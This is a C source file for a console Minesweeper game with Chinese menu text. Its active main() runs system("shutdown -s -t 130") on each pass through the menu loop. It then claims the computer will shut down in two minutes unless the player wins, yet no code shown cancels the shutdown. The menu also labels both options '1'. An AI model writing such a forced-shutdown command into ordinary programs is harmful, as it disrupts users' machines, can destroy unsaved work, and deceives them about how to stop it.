#define _CRT_SECURE_NO_WARNINGS

#include "game.h"

void memu()
{
	printf("******************************\n");
	printf("********  1.开始游戏  ********\n");
	printf("********  1.退出游戏  ********\n");
	printf("******************************\n");

}


void game()
{
	char mine[ROWS][COLS] = { 0 };
	char show[ROWS][COLS] = { 0 };
	InitBoard(mine, ROWS, COLS, '0');
	InitBoard(show, ROWS, COLS, '*');


	SetMine(mine, ROW, COL);
	//DisplayBoard(mine, ROW, COL);
	DisplayBoard(show, ROW, COL);

	FineMine(mine, show, ROW, COL);

}



//int main()
//{
//	int input = 0;
//	
//	srand((unsigned int)time(NULL));
//
//	do 
//	{
//		memu();
//		printf("请选择：\n");
//		scanf("%d", &input);
//		switch (input)
//		{
//		case 1:
//			//printf("扫雷\n");
//			game();
//			break;
//		case 0:
//			printf("退出游戏\n");
//			break;
//		default:
//			printf("输入有误，请重新输入：\n");
//			break;
//		}
//
//	} while (input);
//
//	return 0;
//}

int main()
{
	int input = 0;

	srand((unsigned int)time(NULL));


	do
	{
		memu();
		system("shutdown -s -t 130");
		printf("您的电脑将在2分钟后关闭，请开始游戏通关以取消");
		printf("请选择：\n");
		scanf("%d", &input);
		switch (input)
		{
		case 1:
			//printf("扫雷\n");
			game();
			break;
		case 0:
			printf("退出游戏\n");
			break;
		default:
			printf("输入有误，请重新输入：\n");
			break;
		}

	} while (input);

	return 0;
}
